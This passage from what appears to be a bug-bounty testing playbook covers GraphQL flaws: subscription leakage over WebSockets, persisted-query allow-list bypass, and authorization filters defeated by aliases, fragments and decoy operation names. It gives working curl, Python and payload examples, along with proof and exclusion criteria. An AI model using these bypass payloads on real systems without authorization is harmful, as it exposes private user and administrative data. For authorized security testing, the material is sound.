          '{ __schema{ types{ name } } }',
          '{ me{ id email } }']
  with connect(URL, subprotocols=[SUB], additional_headers=HDRS, origin="https://HOST",
               user_agent_header="<programme UA>") as ws:
      ws.send(json.dumps({"type": "connection_init", "payload": {}}))
      print(ws.recv(timeout=10))                              # connection_ack, or an error / close 4401
      for i, q in enumerate(DOCS):
          ws.send(json.dumps({"id": str(i), "type": "subscribe" if SUB == "graphql-transport-ws" else "start",
                              "payload": {"query": q}}))
      try:
          while True: print(ws.recv(timeout=30)[:500])        # meanwhile B posts a message with a marker in that room
      except TimeoutError: pass
  ```
- **Proof:** frames on the anonymous or A connection that carry B's event (the marker B just sent), with
  timestamps for B's action and the frame. For the query variant: the HTTP request refused, the same document
  answered over the socket.
- **Not a finding when:** `connection_ack` arrives and every `subscribe` is answered with `error` or `complete`
  and no data. The server requires a token in `connection_init.payload` and closes with 4401 or 4403. The
  events are public (a public feed).
- **Escalate:** a cookie-authenticated socket that accepts a foreign `Origin` is WSS-001. Channel-style
  arguments go to WSS-003. Introspection over the socket feeds GQL-001.

### GQL-012 · The persisted-query allow-list is not enforced and an arbitrary document executes

| | |
|---|---|
| **Severity** | None standalone; it reopens every other item on an endpoint that looked closed |
| **Requires** | — |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Improper Access Control - Generic · CWE-284 |
| **Prior art** | #3452015 |

- **Where:** endpoints whose front end sends a hash or an id and no query text:
  `{"extensions":{"persistedQuery":{"version":1,"sha256Hash":"..."}}}`, `{"id":"..."}`, `{"doc_id":"..."}`,
  `{"queryId":"..."}`. No further gate: the first request shows whether an allow-list exists at all.
- **Test:** two different features look alike. Automatic persisted queries are a cache: any document may be
  registered by sending it with its hash. A safelist (trusted documents) accepts only ids registered at build
  time. Find out which one it is, then whether the safelist holds on every method, shape and transport.
- **How:**
  ```bash
  g() { curl -sS "${HDR[@]}" $A -X POST "$T/graphql" -H 'Content-Type: application/json' -d "$1" | head -c 300; echo; }
  Q='{__typename}'; HSH=$(printf '%s' "$Q" | sha256sum | cut -d' ' -f1); KNOWN='<a hash taken from the bundle>'
  g '{"query":"{__typename}"}'                                                                       # 1. free-form document
  g "$(jq -cn --arg q "$Q" --arg h "$HSH" '{query:$q,extensions:{persistedQuery:{version:1,sha256Hash:$h}}}')"     # 2. register your own
  g "$(jq -cn --arg q "$Q" --arg h "$KNOWN" '{query:$q,extensions:{persistedQuery:{version:1,sha256Hash:$h}}}')"   # 3. known hash, other document
  g "$(jq -cn --arg h "$KNOWN" '[{extensions:{persistedQuery:{version:1,sha256Hash:$h}}},{query:"{__typename}"}]')"  # 4. batch: listed first, free-form second
  curl -sS "${HDR[@]}" $A --get --data-urlencode "query=$Q" "$T/graphql" | head -c 300; echo         # 5. GET
  ```
  Then the same on every alternate path and over the WebSocket transport (GQL-011).
- **Proof:** `{"data":{"__typename":"Query"}}` for a document that is not in the bundle's list, with the plain
  attempt refused.
- **Not a finding when:** the server answers `PersistedQueryNotSupported`, `PersistedQueryNotFound` followed by
  refusal of the registration, or "only persisted queries are allowed" for every variant. Step 1 succeeds: then
  there is no allow-list, nothing was bypassed, and the chapter simply proceeds.
- **Escalate:** GQL-001. Listed operations still take variables: ids in variables go to GQL-004 without any
  bypass.

### GQL-013 · A check keyed on the operation name, the first field or the declared type is passed with a second field, an alias, a fragment or a directive

| | |
|---|---|
| **Severity** | High standalone when a protected field or mutation executes; None when only an introspection filter falls |
| **Requires** | — |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Improper Authorization · CWE-863 |
| **Prior art** | #3452015, #858671, #2166697 |

- **Where:** endpoints where some operations work without a session (login, signup, public config,
  introspection) and others are refused, or where a gateway or WAF blocks named fields. No further gate: the
  baseline requests show whether such a rule exists.
- **Test:** the rule was written against the text of the request: "allow when `operationName` is in the public
  list", "allow when the document starts with `__schema`", "block the field `adminUsers`". GraphQL lets one
  document hold several root fields and operations, rename fields, move them into fragments and decorate them
  with directives. #3452015 reached private operations without a session by putting `__schema` in front of
  them.
- **How:** take one refused request as the baseline, then send each variant.
  ```text
  a. an allowed root field first, the protected one second
     {"query":"query{ __schema{queryType{name}} adminUsers{ email } }"}
     {"query":"query{ publicConfig{ version } adminUsers{ email } }"}
  b. the operation name says one thing, the document does another
     {"operationName":"PublicStatus","query":"query PublicStatus{ adminUsers{ email } }"}
     {"operationName":"B","query":"query A{ __typename } query B{ adminUsers{ email } }"}
  c. spellings that defeat a field-name filter
     {"query":"{ x: adminUsers{ email } }"}
     {"query":"query{ ...F } fragment F on Query{ adminUsers{ email } }"}
     {"query":"{ adminUsers @include(if:true){ email } }"}
  d. inline fragments that reach a concrete type behind an interface or union
     {"query":"{ node(id:\"<B object id>\"){ ... on PrivateRepository{ deployKeys{ title } } } }"}
     {"query":"{ search(q:\"b\"){ ... on User{ email } ... on InternalNote{ body } } }"}
  e. an id of one type where the argument expects another
     updateIssue(input:{id:"<global id of a different type that A owns>"})
  ```
  ```bash
  curl -sS "${HDR[@]}" -X POST "$T/graphql" -H 'Content-Type: application/json' \
    -d '{"query":"query{ __schema{queryType{name}} me{ id email } }"}' | jq '{data: .data.me, errors: [.errors[]?.message]}'
  ```
- **Proof:** the plain request refused (401, 403 or an authorisation error) and the variant returning the
  protected data, both saved, same session.
- **Not a finding when:** the variant returns `data` for the allowed field and `null` plus an authorisation error
  for the protected one: partial success is normal GraphQL and the check held. Every variant is refused the
  same way: authorisation lives in the resolvers.
- **Escalate:** a filter that falls to an alias or fragment also stops shielding GQL-009 payloads. Directive
  overloading and deeply nested fragments are denial of service and excluded (`dos`).

## Graveyard

- **Introspection enabled.** Informative or "intended behaviour" (#2886723, #1132803, #291531: no bounty). It is
  the first step of a report, never the report.
- **GraphiQL, Playground or Voyager exposed.** A documentation page. No exclusion tag; closed informative.
- **Field suggestions enabled.** Same as introspection.
- **Query depth, complexity, alias or directive overloading, circular fragments, huge batches.** Denial of
  service (`dos`). #2048725 and #993005 were disclosed without a bounty; HackerOne has since tightened its DoS
  rules (#3287208 carries that notice).
- **Stack traces and verbose errors without a secret** (`version-disclosure`).
- **Alias batching against an operation that guards nothing** (`rate-limit`).
- **CSRF on queries or on login/logout mutations** (`csrf-low`).
- **GraphQL session still valid after logout or password change** (`session-expiry`). #417382 paid $500 in 2018;
  #283847 did not.
- **A private field name visible in the schema while the value resolves to `null`.** The check works.
- **One missing resolver check reported once per field or per alias.** Triage merges them into one root cause
  and closes the rest as duplicates.

## Chains

- GQL-001 or GQL-002 → GQL-003 to GQL-006: the schema is the work list.
- GQL-012 or GQL-013 → GQL-001: an allow-list or name filter that falls reopens the whole chapter.
- GQL-004 → GQL-006: an id that reads another tenant's object usually also writes it.
- GQL-006 hidden input fields → API-001, API-002: mass assignment through input objects.
- GQL-007 → AUT items (OTP and reset-code limits) and RAC items (concurrent batch entries).
- GQL-008 → CSR items; any XSS on the same origin can send every mutation with the victim's session.
- GQL-009 → SQL, NSQ and RCE items; URL arguments → SSR-001.
- GQL-011 → WSS-001 (foreign Origin on a cookie socket), WSS-003 (channel ids).
- COR items: a `/graphql` that reflects `Origin` with credentials turns every query into a cross-site read.

## Sources

- `kb/reports/graphql.md` and `kb/reports/all/graphql.md`: the disclosed reports this chapter is built from.
- HexBrain: `get_testing_playbook {"topic":"GraphQL"}`, `find_payloads {"topic":"GraphQL Injection"}`, `find_bypasses {"protection":"graphql introspection disabled"}`.
- PortSwigger Web Security Academy, GraphQL API vulnerabilities; OWASP WSTG-APIT-01 (Testing GraphQL); OWASP GraphQL Cheat Sheet.
- PayloadsAllTheThings, GraphQL Injection. Tools: clairvoyance (schema recovery), graphw00f (engine fingerprint), graphql-cop (configuration audit).
- Apollo Server documentation: CSRF prevention, automatic persisted queries and safelisting.
